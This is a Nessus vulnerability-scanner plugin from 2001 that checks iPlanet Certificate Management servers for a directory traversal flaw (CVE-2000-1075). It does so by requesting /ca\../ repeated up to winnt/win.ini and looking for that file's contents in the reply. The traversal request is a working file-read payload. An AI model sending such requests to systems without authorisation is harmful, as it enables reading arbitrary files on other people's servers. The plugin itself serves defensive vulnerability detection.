#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# XXX might be redundant with plugin# 10589
#

if(description)
{
 script_id(10683);
 script_version ("$Revision: 1.10 $");
 script_bugtraq_id(1839);
 script_cve_id("CVE-2000-1075"); 
 name["english"] = "iPlanet Certificate Management Traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending /ca/\../\../
in front on the file name.

Solution : Visit http://www.iplanet.com/downloads/patches/index.html
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "\..\..\file.txt";
 summary["francais"] = "\..\..\file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 443);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:443);

foreach port (ports)
 {
 req = http_get(item:string("/ca\\../\\../\\../\\../\\../winnt/win.ini"),
		port:port);

 # ssl negot. is done by nessusd, transparently.
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if(("[windows]" >< r)||
    ("[fonts]" >< r)){
 	security_hole(port);
	}
 }
}
